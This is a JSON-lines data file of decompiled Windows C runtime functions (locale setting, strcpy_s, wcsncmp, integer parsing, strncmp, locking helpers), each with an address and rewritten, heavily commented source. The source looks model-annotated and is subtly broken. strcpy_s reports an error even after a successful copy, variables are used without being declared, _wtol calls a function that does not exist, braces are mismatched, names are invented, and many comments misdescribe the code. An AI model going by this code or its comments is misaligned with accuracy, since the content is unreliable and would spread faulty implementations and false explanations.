*(wchar_t **)(param_1 + 0x28) = destinationString; // Set new destination\n        }\n    }\n    return destinationString; // Return the destination pointer\n}\n"}
{"Function Name": "_wsetlocale_nolock", "Address": "1400142a4", "Source Code": "\nvoid _wsetlocale_nolock(longlong locale_id, int category_index, wchar_t *locale_string)\n{\n    wchar_t *delimiter_pointer; // Pointer to wide character\n    size_t string_length; // Size variable for string length\n    longlong locale_setting_result; // Long long variable for locale setting result\n    int success_counter = 0; // Counter for successful locale settings\n    ulonglong security_cookie = DAT_140038080 ^ (ulonglong)stack_variable; // Local variable for security cookie\n\n    if (category_index != 0) { // Check if param_2 is not zero\n        if (locale_string != (wchar_t *)0x0) { // Check if param_3 is not null\n            _wsetlocale_set_cat(locale_id, category_index, locale_string); // Set locale category\n        }\n        goto LAB_140014455; // Jump to cleanup\n    }\n\n    if (locale_string != (wchar_t *)0x0) { // Check if param_3 is not null\n        int category_counter = 0; // Counter for locale categories\n        if (((*locale_string == L'L') && (locale_string[1] == L'C')) && (locale_string[2] == L'_')) { // Check for locale prefix\n            do {\n                delimiter_pointer = wcspbrk(locale_string, L\"=;\"); // Find '=' or ';' in the locale string\n                if (((delimiter_pointer == (wchar_t *)0x0) || (string_length = (longlong)delimiter_pointer - (longlong)locale_string >> 1, string_length == 0)) || (*delimiter_pointer == L';'))\n                    goto LAB_140014455; // Jump to cleanup if conditions are met\n\n                category_counter = 1; // Set category index\n                undefined **locale_category_pointer = &PTR_u_LC_COLLATE_140029228; // Pointer to locale category names\n                do {\n                    int comparison_index = wcsncmp((wchar_t *)*locale_category_pointer, locale_string, string_length); // Compare locale name\n                    if (comparison_index == 0) { // If match found\n                        size_t character_count = 0xffffffffffffffff; // Initialize size variable\n                        do {\n                            character_count = character_count + 1; // Count characters until null terminator\n                        } while (*(short *)(*locale_category_pointer + character_count * 2) != 0);\n                        if (string_length == character_count) break; // Break if sizes match\n                    }\n                    category_counter++; // Increment category index\n                    locale_category_pointer += 3; // Move to next category\n                } while ((longlong)locale_category_pointer < 0x140029289); // Loop until end of categories\n\n                delimiter_pointer++; // Move past the delimiter\n                string_length = wcscspn(delimiter_pointer, L\";\"); // Get length until next ';'\n                if ((string_length == 0) && (*delimiter_pointer != L';')) goto LAB_140014455; // Jump to cleanup if no valid length\n\n                if (category_counter < 6) { // Check if category index is valid\n                    errno_t copy_error = wcsncpy_s(copied_locale, 0x83, delimiter_pointer, string_length); // Copy locale string safely\n                    if (copy_error != 0) { // Check for copy error\n                        _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handling\n                    }\n                    if (0x105 < string_length * 2) { // Check for buffer overflow\n                        __report_rangecheckfailure(); // Report range check failure\n                        code *pcVar2 = (code *)swi(3); // Switch to error handling\n                        (*pcVar2)(); // Call error handling function\n                        return; // Exit function\n                    }\n                    copied_locale[string_length] = L'\\0'; // Null-terminate the copied string\n                    locale_setting_result = _wsetlocale_set_cat(locale_id, category_counter, copied_locale); // Set locale category\n                    if (locale_setting_result != 0) { // Check if setting was successful\n                        success_counter++; // Increment success counter\n                    }\n                }\n                delimiter_pointer += string_length; // Move pointer past the processed locale string\n                wchar_t next_character = *delimiter_pointer; // Get next character\n                if (next_character != L'\\0') { // If not end of string\n                    next_character = delimiter_pointer[1]; // Get the character after\n                }\n                locale_string = delimiter_pointer + 1; // Update param_3 to point to next character\n                if (*delimiter_pointer == L'\\0') { // If end of string reached\n                    locale_string = delimiter_pointer; // Set param_3 to current position\n                }\n            } while (next_character != L'\\0'); // Continue until end of string\n        } else {\n            locale_setting_result = _expandlocale(locale_string, copied_locale, 0x83, locale_buffer, 0x55, (UINT *)0x0); // Expand locale string\n            if (locale_setting_result == 0) goto LAB_140014455; // Jump to cleanup if expansion failed\n\n            longlong *locale_data_pointer = (longlong *)(locale_id + 0x28); // Pointer to locale data\n            int comparison_index = 0; // Counter for iterations\n            int category_index = 1; // Index for categories\n            do {\n                int current_index = category_index; // Store current index\n                if (comparison_index != 0) { // If not first iteration\n                    delimiter_pointer = copied_locale; // Set pointer to expanded locale\n                    locale_setting_result = *locale_data_pointer - (longlong)delimiter_pointer; // Calculate difference\n                    wchar_t comparison_character; // Variable for comparison\n                    do {\n                        wchar_t next_character = *delimiter_pointer; // Get current character\n                        comparison_character = *(wchar_t *)((longlong)delimiter_pointer + locale_setting_result); // Get character from original locale\n                        if (next_character != comparison_character) break; // Break if characters differ\n                        delimiter_pointer++; // Move to next character\n                    } while (comparison_character != L'\\0'); // Continue until end of string\n\n                    if ((next_character == comparison_character) || (locale_setting_result = _wsetlocale_set_cat(locale_id, comparison_index, copied_locale), current_index = category_counter, locale_setting_result != 0)) { // If match found or setting successful\n                        success_counter++; // Increment success counter\n                        current_index = category_index; // Update index\n                    }\n                }\n                comparison_index++; // Increment iteration counter\n                locale_data_pointer += 4; // Move to next locale data\n                category_index = current_index; // Update index for next iteration\n            } while (comparison_index < 6); // Loop through all categories\n            if (current_index != 0) goto LAB_140014450; // Jump if any category was set\n        }\n        if (success_counter == 0) goto LAB_140014455; // Jump to cleanup if no categories were set\n    }\nLAB_140014450:\n    _wsetlocale_get_all(locale_id); // Get all locale settings\nLAB_140014455:\n    __security_check_cookie(security_cookie ^ (ulonglong)stack_variable); // Security check\n    return; // Exit function\n}\n"}
{"Function Name": "_wsetlocale_set_cat", "Address": "140014538", "Source Code": "\nvoid _wsetlocale_set_cat(longlong locale_param, int category, wchar_t *locale_name) {\n    wchar_t current_char, locale_char; // Variables to hold wide characters for comparison\n    errno_t error_code; // Variable to store error codes from functions\n    longlong thread_data_ptr, locale_expansion_result, comparison_offset, category_long; // Long long variables for various purposes\n    undefined4 *locale_memory_ptr; // Pointer for dynamic memory allocation\n    wchar_t expanded_locale; // Local variable to store expanded locale\n    UINT unsigned_value; // Local variable to store some unsigned integer value\n    wchar_t locale_name_buffer[88]; // Buffer for locale name\n    WORD word_data_buffer[128]; // Buffer for storing some word data\n    ulonglong security_cookie = DAT_140038080 ^ (ulonglong)auStackY_368; // Security cookie for stack protection\n\n    category_long = (longlong)category; // Convert param_2 to longlong\n    thread_data_ptr = __acrt_getptd(); // Get the thread-local data pointer\n    locale_expansion_result = _expandlocale(locale_name, &expanded_locale, 0x83, locale_name_buffer, 0x55, &unsigned_value); // Expand the locale\n    if (locale_expansion_result != 0) { // Check if locale expansion was successful\n        locale_expansion_result = category_long * 0x20; // Calculate offset based on param_2\n        comparison_offset = *(longlong *)(locale_expansion_result + 0x28 + locale_param) - (longlong)&expanded_locale; // Calculate difference for comparison\n        wchar_t *locale_ptr = &expanded_locale; // Pointer to local_308 for character comparison\n        do {\n            current_char = *locale_ptr; // Get current character from local_308\n            locale_char = *(wchar_t *)((longlong)locale_ptr + comparison_offset); // Get corresponding character from the locale\n            if (current_char != locale_char) break; // Break if characters do not match\n            locale_ptr++; // Move to the next character\n        } while (locale_char != L'\\0'); // Continue until null terminator\n\n        if (current_char != locale_char) { // If there was a mismatch\n            comparison_offset = -1; // Initialize lVar17 for counting characters\n            do {\n                comparison_offset++; // Increment lVar17 to count characters until null terminator\n            } while ((&expanded_locale)[comparison_offset] != L'\\0'); // Continue until null terminator\n            locale_memory_ptr = (undefined4 *)_malloc_base(comparison_offset * 2 + 6); // Allocate memory for new locale\n            if (locale_memory_ptr != (undefined4 *)0x0) { // Check if memory allocation was successful\n                *(undefined **)(locale_expansion_result + 0x28 + locale_param) = *(undefined **)(locale_expansion_result + 0x28 + locale_param); // Preserve existing pointer\n                *(undefined8 *)(locale_param + 0x128 + category_long * 8) = *(undefined8 *)(locale_param + 0x128 + category_long * 8); // Preserve existing pointer\n                error_code = wcscpy_s((wchar_t *)(locale_memory_ptr + 1), comparison_offset + 2, &expanded_locale); // Copy the new locale string\n                if (error_code != 0) { // Check for errors during string copy\n                    _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handling\n                }\n                *(undefined4 **)(locale_expansion_result + 0x28 + locale_param) = locale_memory_ptr + 1; // Update pointer to new locale\n                wchar_t *copied_locale_name = (expanded_locale != L'C' || local_306 != 0) ? __acrt_copy_locale_name((undefined1 (*)[32])locale_name_buffer) : (wchar_t *)0x0; // Copy locale name if conditions are met\n                *(wchar_t **)(locale_param + 0x128 + category_long * 8) = copied_locale_name; // Store the copied locale name\n\n                if (category == 2) { // Check if param_2 is 2\n                    *(UINT *)(locale_param + 0xc) = unsigned_value; // Store local_328 in the appropriate location\n                    undefined8 thread_value = *(undefined8 *)(thread_data_ptr + 0x2e8); // Get a value from thread-local data\n                    for (uint loop_index = 0; loop_index < 5; loop_index++) { // Loop through some values\n                        if (*(int *)(locale_param + 0xc) == *(int *)(thread_data_ptr + 0x2c8 + (longlong)loop_index * 8)) { // Check for a match\n                            if (loop_index != 0) { // If not the first entry\n                                *(undefined8 *)(thread_data_ptr + 0x2c8) = *(undefined8 *)(thread_data_ptr + 0x2c8 + (longlong)(int)loop_index * 8); // Update pointers\n                                *(undefined8 *)(thread_data_ptr + 0x2c8 + (longlong)(int)loop_index * 8) = thread_value; // Set new value\n                            }\n                            break; // Exit loop\n                        }\n                        undefined8 current_value = *(undefined8 *)(thread_data_ptr + 0x2c8 + (longlong)loop_index * 8); // Get current value\n                        *(undefined8 *)(thread_data_ptr + 0x2c8 + (longlong)loop_index * 8) = thread_value; // Update with new value\n                    }\n                    *(uint *)(thread_data_ptr + 0x2cc) = (uint)(memcmp(word_data_buffer, PTR_DAT_140038198, 0xfe) == 0); // Compare and store result\n                    *(undefined4 *)(thread_data_ptr + 0x2c8) = *(undefined4 *)(locale_param + 0xc); // Update value in thread-local data\n                } else if (category == 1) { // Check if param_2 is 1\n                    *(UINT *)(locale_param + 0x14) = unsigned_value; // Store local_328 in the appropriate location\n                } else if (category == 5) { // Check if param_2 is 5\n                    *(UINT *)(locale_param + 0x18) = unsigned_value; // Store local_328 in the appropriate location\n                }\n\n                if ((*(code *)PTR__guard_dispatch_icall_1400213e8)(locale_param) == 0) { // Check for guard dispatch\n                    if (*(undefined **)(locale_expansion_result + 0x28 + locale_param) != &DAT_140038318) { // Check if pointer is not a specific value\n                        int *integer_ptr = *(int **)(locale_expansion_result + 0x38 + locale_param); // Get pointer to integer\n                        LOCK(); // Acquire lock\n                        int current_ref_count = *integer_ptr; // Get current value\n                        *integer_ptr = *integer_ptr - 1; // Decrement value\n                        UNLOCK(); // Release lock\n                        if (current_ref_count == 1) { // Check if it was the last reference\n                            _free_base(*(LPVOID *)(locale_expansion_result + 0x38 + locale_param)); // Free memory\n                            _free_base(*(LPVOID *)(locale_expansion_result + 0x30 + locale_param)); // Free memory\n                            _free_base(*(LPVOID *)(locale_param + 0x128 + category_long * 8)); // Free memory\n                            *(undefined8 *)(locale_expansion_result + 0x28 + locale_param) = 0; // Nullify pointer\n                            *(undefined8 *)(locale_param + 0x128 + category_long * 8) = 0; // Nullify pointer\n                        }\n                    }\n                    *locale_memory_ptr = 1; // Set value in allocated memory\n                    *(undefined4 **)(locale_expansion_result + 0x38 + locale_param) = locale_memory_ptr; // Update pointer to allocated memory\n                } else { // If guard dispatch failed\n                    *(undefined **)(locale_expansion_result + 0x28 + locale_param) = *(undefined **)(locale_expansion_result + 0x28 + locale_param); // Preserve existing pointer\n                    _free_base(*(LPVOID *)(locale_param + 0x128 + category_long * 8)); // Free memory\n                    *(undefined8 *)(locale_param + 0x128 + category_long * 8) = *(undefined8 *)(locale_param + 0x128 + category_long * 8); // Preserve existing pointer\n                    _free_base(locale_memory_ptr); // Free allocated memory\n                    *(undefined4 *)(locale_param + 0xc) = *(undefined4 *)(locale_param + 0xc); // Preserve existing value\n                }\n            }\n        }\n    }\n    __security_check_cookie(security_cookie ^ (ulonglong)auStackY_368); // Check security cookie\n    return; // Return from function\n}\n"}
{"Function Name": "FUN_14001488c", "Address": "14001488c", "Source Code": "\nundefined4 getGlobalValue(void) // Function definition with return type undefined4\n{\n    return globalValue; // Return the value of the global variable DAT_14003a288\n}\n"}
{"Function Name": "FUN_140014894", "Address": "140014894", "Source Code": "\nuint FUN_140014894(uint input_value)\n{\n    // Check if the input parameter is less than 2\n    if (input_value < 2) {\n        acquire_lock(); // Acquire a lock for thread safety\n        release_lock(); // Release the lock\n        global_value = input_value; // Store the input parameter in a global variable\n        return global_value; // Return the stored value\n    } else {\n        *error_code() = 0x16; // Set the error code to 0x16\n        handle_error(); // Call an error handling function\n        return 0xffffffff; // Return an error value\n    }\n}\n"}
{"Function Name": "FUN_1400148c0", "Address": "1400148c0", "Source Code": "\n// Function declaration: FUN_1400148c0 returns a pointer to an undefined type\nundefined * getUndefinedPointer(void)\n{\n    // Return the address of the global variable DAT_14003a28c\n    return &globalVariable;\n}\n"}
{"Function Name": "strcpy_s", "Address": "1400148c8", "Source Code": "\nerrno_t __cdecl strcpy_s(char *destination, rsize_t size_in_bytes, char *source)\n{\n    char current_char; // Variable to hold the current character from the source\n    ulong *error_number_ptr; // Pointer to hold the address of the error number\n    ulong error_code; // Variable to hold the error code\n    char *destination_ptr; // Pointer for destination string manipulation\n\n    // Check if destination pointer is not null and size is not zero\n    if ((destination != (char *)0x0) && (size_in_bytes != 0)) {\n        // Check if source pointer is not null\n        if (source != (char *)0x0) {\n            destination_ptr = destination; // Initialize destination pointer\n            do {\n                current_char = *source; // Get the current character from source\n                *destination_ptr++ = current_char; // Copy character to destination\n                if (current_char == '\\0') break; // Break if null terminator is found\n                source++; // Move to the next character in source\n                size_in_bytes--; // Decrease remaining size\n            } while (size_in_bytes != 0); // Continue until size is zero\n            \n            // Check if there is still space left in destination\n            if (size_in_bytes != 0) {\n                *destination = '\\0'; // Null-terminate the destination string\n                error_number_ptr = __doserrno(); // Get the address of the error number\n                error_code = 0x22; // Set error code for buffer overflow\n                goto LAB_1400148eb; // Jump to error handling\n            }\n            *destination = '\\0'; // Null-terminate the destination string\n        }\n    }\n    *destination = '\\0'; // Null-terminate the destination string in case of null source\n    error_number_ptr = __doserrno(); // Get the address of the error number\n    error_code = 0x16; // Set error code for null source\nLAB_1400148eb:\n    *error_number_ptr = error_code; // Store the error code\n    FUN_14000ecf8(); // Call error handling function\n    return error_code; // Return the error code\n}\n"}
{"Function Name": "wcsncmp", "Address": "140014928", "Source Code": "\nint __cdecl wcsncmp(wchar_t *firstString, wchar_t *secondString, size_t maxCount)\n{\n    // Check if the maximum count is zero\n    if (maxCount == 0) {\n        return 0; // If zero, return 0 indicating no difference\n    }\n    \n    // Loop until the maximum count is decremented to zero, or either string ends, or characters differ\n    while (maxCount-- != 0 && *firstString != L'\\0' && *firstString == *secondString) {\n        firstString++; // Move to the next character in the first string\n        secondString++; // Move to the next character in the second string\n    }\n    \n    // Return the difference between the current characters of the two strings\n    return (uint)(ushort)*firstString - (uint)(ushort)*secondString;\n}\n"}
{"Function Name": "__crt_strtox::parse_integer<unsigned_long,class___crt_strtox::c_string_character_source<wchar_t>_>", "Address": "140014954", "Source Code": "\nulong __cdecl\n__crt_strtox::parse_integer<unsigned_long,class___crt_strtox::c_string_character_source<wchar_t>_>\n(__crt_locale_pointers *param_1,longlong *param_2,uint param_3,byte param_4)\n{\n    wint_t *pwVar2; // Pointer to the current character in the input string\n    wint_t *pwVar3; // Pointer used for iterating through the input string\n    longlong lVar5; // Temporary variable to hold a long long value\n    int iVar6; // Temporary variable for integer operations\n    ulong *puVar7; // Pointer to store error codes\n    byte bVar8; // Variable to hold flags for error conditions\n    uint uVar9; // Variable to hold the current digit value\n    ushort _C; // Current character being processed\n    ulong uVar10 = 0; // Accumulator for the parsed integer value\n    ulonglong uVar13 = (ulonglong)param_3; // Store the base for conversion\n\n    // Check for invalid input conditions\n    if ((*param_2 == 0) || ((param_3 != 0 && (0x22 < param_3 - 2)))) {\n        puVar7 = __doserrno(); // Get the pointer to the error number\n        *puVar7 = 0x16; // Set the error number to indicate an invalid argument\n        FUN_14000ecf8(); // Call error handling function\n        return 0; // Return 0 to indicate failure\n    }\n    \n    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_48,param_1); // Update locale settings\n    pwVar2 = (wint_t *)*param_2; // Initialize pointer to the current character\n    _C = *pwVar2; // Get the current character\n    pwVar3 = pwVar2; // Set the working pointer to the current character\n\n    while (true) {\n        *param_2 = (longlong)(pwVar3 + 1); // Move to the next character\n        iVar6 = iswctype(_C, 8); // Check if the character is a valid type\n        if (iVar6 == 0) break; // Exit loop if character is not valid\n        pwVar3 = (wint_t *)*param_2; // Update working pointer\n        _C = *pwVar3; // Get the next character\n    }\n\n    byte bVar11 = param_4 | 2; // Set flags based on input parameter\n    if (_C != 0x2d) { // Check for negative sign\n        bVar11 = param_4; // Reset flags if not negative\n    }\n    if ((_C - 0x2b & 0xfffd) == 0) { // Check for positive sign\n        _C = *(ushort *)*param_2; // Get the next character\n        *param_2 = (longlong)((ushort *)*param_2 + 1); // Move to the next character\n    }\n    iVar6 = 0xff10; // Initialize variable for character conversion\n    if ((param_3 & 0xffffffef) != 0) goto LAB_140014c9c; // Check for base conditions\n    if (_C < 0x30) goto LAB_140014bf9; // Check if character is less than '0'\n    if (_C < 0x3a) { // Check if character is a digit\n        iVar6 = _C - 0x30; // Convert character to integer value\n        goto LAB_140014bf4; // Proceed to further processing\n    } else {\n        // Handle hexadecimal and other character conversions\n        if (0xff0f < _C) {\n            if (_C < 0xff1a) {\n                iVar6 = (uint)_C - iVar6; // Convert character for specific ranges\n            } else {\n                iVar6 = -1; // Invalid character\n            }\n            goto LAB_140014bf4; // Proceed to further processing\n        }\n        // Additional character conversion logic for various ranges\n        if (0x65f < _C) {\n            if (_C < 0x66a) {\n                iVar6 = _C - 0x660; // Convert character for specific range\n                goto LAB_140014bf4; // Proceed to further processing\n            }\n            // More character checks and conversions...\n        }\n    }\nLAB_140014bf9:\n    // Handle alphabetic character conversion to integer\n    if (((ushort)(_C - 0x41) < 0x1a) || ((ushort)(_C - 0x61) < 0x1a)) {\n        uVar9 = _C - 0x20; // Adjust for uppercase letters\n        if (0x19 < (ushort)(_C - 0x61)) {\n            uVar9 = (uint)_C; // Adjust for lowercase letters\n        }\n        iVar6 = uVar9 - 0x37; // Convert to integer value\n    } else {\n        iVar6 = -1; // Invalid character\n    }\n    if (iVar6 == 0) { // Check if the character is valid\n        short *psVar4 = (short *)*param_2; // Get the next character\n        short sVar1 = *psVar4; // Store the current character\n        *param_2 = (longlong)(psVar4 + 1); // Move to the next character\n        if ((sVar1 - 0x58U & 0xffdf) != 0) { // Check for valid hex character\n            uVar9 = param_3 != 0 ? param_3 : 8; // Determine base for conversion\n            *param_2 = (longlong)psVar4; // Reset pointer\n            uVar13 = (ulonglong)uVar9; // Update base\n            if ((sVar1 != 0) && (*psVar4 != sVar1)) { // Check for character mismatch\n                puVar7 = __doserrno(); // Get error pointer\n                *puVar7 = 0x16; // Set error number\n                FUN_14000ecf8(); // Call error handling function\n            }\n            goto LAB_140014c9c; // Proceed to conversion\n        }\n        _C = psVar4[1]; // Get the next character\n        *param_2 = (longlong)(psVar4 + 2); // Move to the next character\n        uVar9 = 0x10; // Set base to hexadecimal\n    } else {\n        uVar9 = 10; // Default base is decimal\n    }\n    if (param_3 != 0) {\n        uVar9 = param_3; // Use provided base if available\n    }\n    uVar13 = (ulonglong)uVar9; // Update base for conversion\nLAB_140014c9c:\n    do {\n        // Process character to extract integer value\n        if (_C < 0x30) goto LAB_140014e6a; // Check if character is less than '0'\n        if (_C < 0x3a) {\n            uVar9 = _C - 0x30; // Convert digit character to integer\n            goto LAB_140014e65; // Proceed to further processing\n        } else {\n            // Handle hexadecimal and other character conversions\n            if (0xff0f < _C) {\n                if (_C < 0xff1a) {\n                    uVar9 = _C - 0xff10; // Convert for specific range\n                } else {\n                    uVar9 = 0xffffffff; // Invalid character\n                }\n                goto LAB_140014e65; // Proceed to further processing\n            }\n            // More character checks and conversions...\n        }\n    }\nLAB_140014e6a:\n    // Handle alphabetic character conversion to integer\n    if (((ushort)(_C - 0x41) < 0x1a) || ((ushort)(_C - 0x61) < 0x1a)) {\n        uVar9 = _C - 0x20; // Adjust for uppercase letters\n        if (0x19 < (ushort)(_C - 0x61)) {\n            uVar9 = (uint)_C; // Adjust for lowercase letters\n        }\n        uVar9 = uVar9 - 0x37; // Convert to integer value\n    } else {\n        uVar9 = 0xffffffff; // Invalid character\n    }\n    if ((uVar9 == 0xffffffff) || ((uint)uVar13 <= uVar9)) break; // Check for overflow\n    uint uVar12 = (uint)(0xffffffff / uVar13); // Calculate maximum value for current base\n    if ((uVar10 < uVar12) || ((uVar10 == uVar12 && (uVar9 <= (uint)(0xffffffff % uVar13))))) {\n        bVar8 = 8; // Set overflow flag\n        uVar10 = uVar10 * (uint)uVar13 + uVar9; // Update accumulated value\n    } else {\n        bVar8 = 0xc; // Set error flag for overflow\n    }\n    _C = *(ushort *)*param_2; // Get the next character\n    *param_2 = (longlong)((ushort *)*param_2 + 1); // Move to the next character\n    bVar11 = bVar11 | bVar8; // Update flags\n} while (true);\n\nlVar5 = *param_2; // Store the current position\n*param_2 = lVar5 + -2; // Adjust position for character processing\nif ((_C != 0) && (*(ushort *)(lVar5 + -2) != _C)) { // Check for character mismatch\n    puVar7 = __doserrno(); // Get error pointer\n    *puVar7 = 0x16; // Set error number\n    FUN_14000ecf8(); // Call error handling function\n}\nif ((bVar11 & 8) == 0) { // Check for overflow flag\n    *param_2 = (longlong)pwVar2; // Reset position pointer\n    if (local_30 != '\\0') { // Check for locale update flag\n        *(uint *)(local_48[0] + 0x3a8) = *(uint *)(local_48[0] + 0x3a8) & 0xfffffffd; // Update locale settings\n    }\n    if ((longlong *)param_2[1] != (longlong *)0x0) { // Check for valid pointer\n        *(longlong *)param_2[1] = *param_2; // Update position in output parameter\n    }\n    return 0; // Return success\n}\nif ((bVar11 & 4) != 0) goto LAB_140014f51; // Check for specific error condition\nif ((bVar11 & 1) == 0) { // Check for negative flag\n    if ((bVar11 & 2) != 0) {\n        uVar10 = -uVar10; // Negate the accumulated value\n    }\n} else {\n    if ((bVar11 & 2) == 0) {\n        if (uVar10 < 0x80000000) goto LAB_140014f95; // Check for valid range\n    } else if (uVar10 < 0x80000001) goto LAB_140014f95; // Check for valid range\nLAB_140014f51:\n    puVar7 = __doserrno(); // Get error pointer\n    *puVar7 = 0x22; // Set error number for range error\n    if ((bVar11 & 1) != 0) { // Check for negative flag\n        if ((bVar11 & 2) != 0) { // Check for overflow\n            if (local_30 != '\\0') {\n                *(uint *)(local_48[0] + 0x3a8) = *(uint *)(local_48[0] + 0x3a8) & 0xfffffffd; // Update locale settings\n            }\n            if ((longlong *)param_2[1] != (longlong *)0x0) {\n                *(longlong *)param_2[1] = *param_2; // Update position in output parameter\n            }\n            return 0x80000000; // Return overflow value\n        }\n        if (local_30 != '\\0') {\n            *(uint *)(local_48[0] + 0x3a8) = *(uint *)(local_48[0] + 0x3a8) & 0xfffffffd; // Update locale settings\n        }\n        if ((longlong *)param_2[1] != (longlong *)0x0) {\n            *(longlong *)param_2[1] = *param_2; // Update position in output parameter\n        }\n        return 0x7fffffff; // Return maximum value\n    }\n    uVar10 = 0xffffffff; // Set return value to indicate error\n}\nif (local_30 != '\\0') {\n    *(uint *)(local_48[0] + 0x3a8) = *(uint *)(local_48[0] + 0x3a8) & 0xfffffffd; // Update locale settings\n}\nif ((longlong *)param_2[1] == (longlong *)0x0) { // Check for valid pointer\n    return uVar10; // Return the accumulated value\n}\n*(longlong *)param_2[1] = *param_2; // Update position in output parameter\nreturn uVar10; // Return the accumulated value\n}\n"}
{"Function Name": "_wtol", "Address": "140015008", "Source Code": "\nlong __cdecl _wtol(wchar_t *wideCharStr) // Function declaration for _wtol, which converts a wide character string to a long integer\n{\n    // Call to parse_integer function from __crt_strtox namespace\n    // Converts the wide character string _Str to an unsigned long integer\n    // Parameters:\n    // 0 - initial value\n    // &_Str - pointer to the wide character string (input)\n    // 10 - base for conversion (decimal)\n    // 1 - indicates that the conversion should be performed\n    return stringConversion::convertToInteger<unsignedLong,class___crt_strtox::c_string_character_source<wchar_t>_>(0, &wideCharStr, 10, 1);\n}\n"}
{"Function Name": "strncmp", "Address": "140015050", "Source Code": "\nint __cdecl strncmp(char *str1, char *str2, size_t maxCount)\n{\n    ulonglong alignment; // Variable to hold the alignment of _Str1\n    byte currentByte;      // Variable to hold the current byte being compared\n\n    if (maxCount != 0) { // Check if there are characters to compare\n        while (true) { // Infinite loop to compare characters\n            alignment = (ulonglong)str1 & 7; // Check the alignment of _Str1\n            if (alignment == 0) { // If _Str1 is aligned to 8 bytes\n                // Compare 8 bytes at a time while there are enough characters left\n                while (maxCount >= 8 && *(ulonglong *)str1 == *(ulonglong *)str2) {\n                    str1 += 8; // Move to the next 8 bytes in _Str1\n                    str2 += 8; // Move to the next 8 bytes in _Str2\n                    maxCount -= 8; // Decrease the count of remaining characters\n                }\n            }\n            currentByte = *(byte *)str1; // Get the current byte from _Str1\n            // Compare the current bytes from _Str1 and _Str2\n            if (currentByte != *(byte *)str2) {\n                // Return the comparison result: negative if bVar1 < _Str2, else positive\n                return -(uint)(currentByte < *(byte *)str2) | 1;\n            }\n            str1++; // Move to the next byte in _Str1\n            str2++; // Move to the next byte in _Str2\n            maxCount--; // Decrease the count of remaining characters\n            if (maxCount == 0 || currentByte == 0) break; // Exit if no characters left or null terminator found\n        }\n    }\n    return 0; // Return 0 if the strings are equal or if the comparison is complete\n}\n"}
{"Function Name": "operator()<>", "Address": "1400150d0", "Source Code": "\\*\nvoid operator()<>(undefined8 resource_id, int *lock_resource, undefined8 *object_pointer, int *unlock_resource)\n{\n    // Lock the resource associated with param_2\n    __acrt_lock(*lock_resource);\n    \n    // Acquire a lock for critical section\n    LOCK();\n    \n    // Increment the integer value located at offset 0x88 of the object pointed to by param_3\n    **(int **)(*(longlong *)*object_pointer + 0x88) += 1;\n    \n    // Release the lock after the critical section\n    UNLOCK();\n    \n    // Unlock the resource associated with param_4\n    __acrt_unlock(*unlock_resource);\n}\n*\\ \n \n\nvoid operator()<>(undefined8 resource_id, int *lock_resource, undefined8 *object_pointer, int *unlock_resource)\n{\n    __acrt_lock(*lock_resource);\n    LOCK();\n    **(int **)(*(longlong *)*object_pointer + 0x88) += 1;\n    UNLOCK();\n    __acrt_unlock(*unlock_resource);\n}\n"}
{"Function Name": "operator()<>", "Address": "140015110", "Source Code": "\\*\nvoid operator()<>(undefined8 locale_param, int *lock_value, undefined8 *thread_locale, int *unlock_value)\n{\n    // Lock the critical section using the value pointed to by param_2\n    __acrt_lock(*lock_value);\n    \n    // Replace the current thread's locale without holding the lock\n    replace_current_thread_locale_nolock(*(__acrt_ptd **)*thread_locale, (__crt_locale_data *)0x0);\n    \n    // Unlock the critical section using the value pointed to by param_4\n    __acrt_unlock(*unlock_value);\n}\n*\\ \n \n\nvoid operator()<>(undefined8 locale_param, int *lock_value, undefined8 *thread_locale, int *unlock_value)\n{\n    __acrt_lock(*lock_value);\n    replace_current_thread_locale_nolock(*(__acrt_ptd **)*thread_locale, (__crt_locale_data *)0x0);\n    __acrt_unlock(*unlock_value);\n}\n"}
{"Function Name": "operator()<>", "Address": "140015150", "Source Code": "\\*\nvoid operator()<>(undefined8 locale_param, int *lock_value, undefined8 *locale_data, int *unlock_value)\n{\n    // Lock the critical section using the value pointed to by param_2\n    __acrt_lock(*lock_value);\n    \n    // Replace the current thread's locale without holding the lock\n    replace_current_thread_locale_nolock(*(__acrt_ptd **)*locale_data, (__crt_locale_data *)**(undefined8 **)locale_data[1]);\n    \n    // Unlock the critical section using the value pointed to by param_4\n    __acrt_unlock(*unlock_value);\n}\n*\\ \n \n\nvoid operator()<>(undefined8 locale_param, int *lock_value, undefined8 *locale_data, int *unlock_value)\n{\n    __acrt_lock(*lock_value);\n    replace_current_thread_locale_nolock(*(__acrt_ptd **)*locale_data, (__crt_locale_data *)**(undefined8 **)locale_data[1]);\n    __acrt_unlock(*unlock_value);\n}\n"}
{"Function Name": "operator()<>", "Address": "140015198", "Source Code": "\\*\nvoid operator()<>(undefined8 input_param, int *lock_param, undefined8 *pointer_param, int *unlock_param)\n{\n    int current_value; // Variable to hold the value pointed to by piVar2\n    int *integer_pointer; // Pointer to an integer\n\n    __acrt_lock(*lock_param); // Acquire a lock using the value pointed to by param_2\n\n    integer_pointer = *(int **)(*(longlong *)*pointer_param + 0x88); // Dereference param_3 to get a pointer to an integer\n\n    if (integer_pointer != (int *)0x0) { // Check if piVar2 is not null\n        LOCK(); // Lock the critical section\n\n        current_value = *integer_pointer; // Get the current value pointed to by piVar2\n        *integer_pointer = *integer_pointer - 1; // Decrement the value pointed to by piVar2\n\n        UNLOCK(); // Unlock the critical section\n\n        if ((current_value == 1) && (integer_pointer != (int *)&DAT_1400387d0)) { // Check if the value was 1 and piVar2 is not a specific address\n            _free_base(integer_pointer); // Free the memory pointed to by piVar2\n        }\n    }\n\n    __acrt_unlock(*unlock_param); // Release the lock using the value pointed to by param_4\n}\n*\\ \n \n\nvoid operator()<>(undefined8 input_param, int *lock_param, undefined8 *pointer_param, int *unlock_param)\n{\n    int current_value;\n    int *integer_pointer;\n    __acrt_lock(*lock_param);\n    integer_pointer = *(int **)(*(longlong *)*pointer_param + 0x88);\n    if (integer_pointer != (int *)0x0) {\n        LOCK();\n        current_value = *integer_pointer;\n        *integer_pointer = *integer_pointer - 1;\n        UNLOCK();\n        if ((current_value == 1) && (integer_pointer != (int *)&DAT_1400387d0)) {\n            _free_base(integer_pointer);\n        }\n    }\n    __acrt_unlock(*unlock_param);\n}\n"}
